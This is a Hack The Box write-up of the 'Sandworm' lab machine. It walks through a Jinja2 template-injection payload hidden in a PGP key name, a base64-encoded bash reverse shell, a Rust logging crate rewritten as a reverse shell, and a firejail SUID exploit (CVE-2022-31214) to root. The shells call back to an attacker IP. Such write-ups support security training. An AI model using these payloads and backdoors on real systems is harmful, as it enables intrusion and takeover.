---
layout: post
title: "HTB: Sandworm"
subtitle: "Jinja2 SSTI in a PGP key UID for RCE inside firejail, a writable Rust crate to pivot to atlas, then a firejail SUID exploit to root"
date: 2023-07-16
tags: [htb, linux, ssti, cargo, firejail, privesc]
category: writeups
kind: machine
tldr: "ssa.htb verified submitted PGP keys, and the key UID was rendered through Jinja2, giving SSTI and RCE inside a firejail sandbox. A leaked httpie session handed me silentobserver over SSH. A root cron built a writable Rust crate as atlas, so I backdoored the logger crate, then used a firejail SUID exploit for root."
---
{% raw %}

## the box

Sandworm is a medium Linux box at `10.10.11.218`, themed as the "Secret Spy Agency" (SSA). It runs a Flask app on nginx behind both HTTP and HTTPS, and the app lets you submit and verify PGP-signed messages and public keys. The chain is four distinct steps: SSTI in a PGP key UID for code execution inside a firejail sandbox, a leaked httpie session for SSH as another user, a root-driven Rust build that compiles a crate I can write to, and finally a known firejail SUID local privesc to root. The sandbox is the twist; the first shell can barely see the filesystem, so the leaked creds are the real way forward.

## recon

Full versioned scan on the three open ports.

```bash
nmap -p- --min-rate 10000 10.10.11.218
nmap -p 22,80,443 -sCV 10.10.11.218
```

```
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/emailAddress=atlas@ssa.htb/organizationalUnitName=SSA
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH 8.9p1 on the `3ubuntu0.1` package put this on Ubuntu 22.04 jammy. Port 80 redirected to `https://ssa.htb/`, so the real app is on 443. The TLS cert is full of hints: `commonName=SSA`, `organizationName=Secret Spy Agency`, and `emailAddress=atlas@ssa.htb`. That `atlas` is the web user, and it confirms the SSA theme. I added the vhost and browsed.

```bash
echo '10.10.11.218 ssa.htb' | sudo tee -a /etc/hosts
```

The 404 page and footer gave away Flask. Directory enumeration filled in the routes.

```bash
feroxbuster -u https://ssa.htb -k
```

```
/about                (Status: 200) [Size: 5584]
/contact              (Status: 200) [Size: 3543]
/login                (Status: 302) [--> /login]
/view                 (Status: 302) [--> /login?next=%2Fview]
/admin                (Status: 302) [--> /login?next=%2Fadmin]
/guide                (Status: 200) [Size: 9043]
/pgp                  (Status: 200) [Size: 3187]
/logout               (Status: 302) [--> /login?next=%2Flogout]
/process              (Status: 405) [Size: 153]
```

`/login` is a rabbit hole. `/admin` and `/view` redirect to login, so they want a session I do not have yet. `/pgp` serves the agency's public key. `/process` returns 405 to a GET, which means it only takes POST and is the backend for one of the forms. The interesting page is `/guide`, which has a working demo: submit a public key plus a clearsigned message and the server verifies the signature with GnuPG, echoing back the result including the key's user ID. That echo of the UID is the attack surface. A field I fully control gets rendered into a server-side template.

A vhost fuzz against the cert hostname found nothing extra.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.ssa.htb" -u https://ssa.htb -fs 8161
```

## foothold

The plan: generate a GPG key whose real name is a Jinja2 expression, clearsign a message with it, then submit the public key and the signed message to `/guide`. If the verify output renders the expression instead of printing it literally, the UID is going through Jinja2 unescaped.

I generated the key with the SSTI probe as the real name.

```bash
gpg --gen-key
```

```
Real name: {{7*7}}
Email address: hobala@hobala.hobala
You selected this USER-ID:
    "{{7*7}} <hobala@hobala.hobala>"
```

Exported the public key, clearsigned a throwaway message, and submitted both to the verify form.

```bash
gpg --armor --export hobala@hobala.hobala
gpg --clear-sign text
```

The verification output came back with the UID evaluated.

```
... gpg: Good signature from "49 " [unknown] ...
Primary key fingerprint: B190 709C 7D3B 5821 D6DD 1007 DA6F 52A5 4E53 B4F0
```

`{{7*7}}` rendered as `49`, so the key UID is Jinja2 server-side template injection. Direct `os.popen` shorthand was filtered, so I enumerated reachable classes through the subclasses chain to find a usable sink. The class dump put `subprocess.Popen` around index 440 of `__subclasses__()`, and I tried calling it directly.

```
{{ [].__class__.__mro__[-1].__subclasses__()[440]("uname -a", shell=True, stdout=-1).communicate()[0]}}
```

That fought the filter, so I stopped fighting the payload character set and base64-encoded the actual command. Encode the reverse shell on my side, then decode and pipe to bash inside the template through `os.popen`.

```bash
echo 'bash -i >& /dev/tcp/10.10.16.29/1337 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS8xMzM3IDA+JjE=
```

The working payload as the key's real name:

```
{{ self.init.globals.builtins.import('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS8xMzM3IDA+JjE= | base64 -d | bash').read() }}
```

I regenerated the key with that UID, re-clearsigned, resubmitted, and the listener caught a shell as `atlas`.

```
nc -lnvp 1337
atlas@sandworm:/$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```

The catch: this shell is inside a firejail sandbox. The filesystem view is restricted, most binaries are missing, and `atlas`'s real home is not fully visible. Enough to read the web app config, not enough to escalate directly. The web app's MySQL string was readable (`atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA`) but that database had nothing useful. The way out is what `atlas` left lying around.

## user

Wandering the parts of `atlas`'s home that were visible, I found a stored httpie session. httpie caches auth in cleartext JSON per host.

```bash
cat ~/.config/httpie/sessions/localhost_5000/admin.json
```

```json
{ "meta": { "about": "HTTPie session file", "httpie": "2.6.0" },
  "auth": { "password": "quietLiketheWind22", "type": null, "username": "silentobserver" },
  "cookies": { "session": { "value": "eyJfZmxhc2hlcyI6..." } },
  "headers": { "Accept": "application/json, /;q=0.5" } }
```

`silentobserver:quietLiketheWind22`. That password was reused for the system account, so SSH worked and dropped me out of the sandbox into a normal session.

```bash
ssh silentobserver@ssa.htb
# password: quietLiketheWind22
```

```
silentobserver@sandworm:~$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
silentobserver@sandworm:~$ cat user.txt
```

## root

A normal shell let me run pspy and watch for scheduled jobs. Something Rust-flavored fired on a short interval.

```
2023/07/15 23:19:08 CMD: UID=0 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/07/15 23:19:08 CMD: UID=0 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/07/15 23:20:01 CMD: UID=0 | /bin/bash /root/Cleanup/clean.sh
2023/07/15 23:20:01 CMD: UID=0 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
2023/07/15 23:20:11 CMD: UID=0 | /bin/rm -r /opt/crates
2023/07/15 23:20:11 CMD: UID=0 | /bin/bash /root/Cleanup/clean_c.sh
```

So root runs a cleanup script, restores the firejail profile, then builds and runs `/opt/tipnet` with `cargo run --offline` as `atlas`. The build is the lever. If `tipnet` depends on a crate whose source I can write to, I write code as `silentobserver`, root compiles and runs it as `atlas`, and I get back to `atlas` outside the jail. Note the cron also does `rm -r /opt/crates` and rebuilds, so any edit has to land in the window before it gets wiped.

I went to `/opt` and traced the dependency.

```bash
cd /opt
ls
# crates  tipnet
ls -la /opt/crates
# drwxr-xr-x 3 root  atlas          4096 May  4 17:26 .
# drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 logger
cat /opt/crates/logger/src/lib.rs
```

`tipnet` pulls in a local crate `logger` from `/opt/crates/logger`, and its `src/lib.rs` is group-writable by `silentobserver`.

```
-rw-rw-r-- 1 atlas silentobserver 732 May 4 17:12 lib.rs
```

The original `lib.rs` just appends to a log file through a `log()` function:

```rust
pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
    // append to /opt/tipnet/access.log
}
```

`tipnet` calls `log()` on every run, so I rewrote that function body to be a reverse shell instead. When the cron compiles and runs `tipnet` as `atlas`, my code executes.

```rust
extern crate chrono;

use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
        let sock = TcpStream::connect("10.10.16.29:4444").unwrap();
        let fd = sock.as_raw_fd();
        Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn().unwrap().wait().unwrap();
}
```

I dropped that in, started a listener, and waited for the build cycle. Within a couple minutes the cron rebuilt `tipnet`, the backdoored `log()` ran, and I had a shell as `atlas` outside the sandbox this time.

```
nc -lnvp 4444
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Now for root. The SUID search flagged firejail.

```bash
find / -perm /4000 2>/dev/null
```

```
/usr/local/bin/firejail
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
...
```

This firejail is `0.9.68`, vulnerable to CVE-2022-31214, a SUID local privilege escalation patched in 0.9.70. The PoC abuses firejail's `--join`: it spins up a helper sandbox, fakes the join state files through unshared user and mount namespaces, then bind-mounts a permissive PAM config over `/etc/pam.d/su` so that joining the namespace and running `su -` succeeds without a password. The setuid-root `su` runs inside a mount namespace the attacker controls.

I ran the Python PoC as `atlas`. It printed the PID to join.

```bash
python3 firejail-exploit.py
```

```
You can now run 'firejail --join=1126645' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

In a second `atlas` shell I joined that PID. The detail that matters: just `su -`, not `sudo su -`, since the PAM override is on `su`.

```bash
firejail --join=1126645
su -
```

```
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~# cat /root/root.txt
```

## takeaway

SSTI in a PGP key UID gave code execution, but only inside a firejail sandbox, so the leaked httpie session in cleartext JSON was the real way out. The atlas pivot was a writable-dependency build: a root cron compiled a Rust crate I could edit, so backdooring `logger`'s `log()` function ran my code as atlas outside the jail. The filters on the SSTI just meant base64-encoding the command instead of sending it raw. Root was firejail 0.9.68 and CVE-2022-31214, and the only gotcha was `su -` rather than `sudo su -`.
{% endraw %}
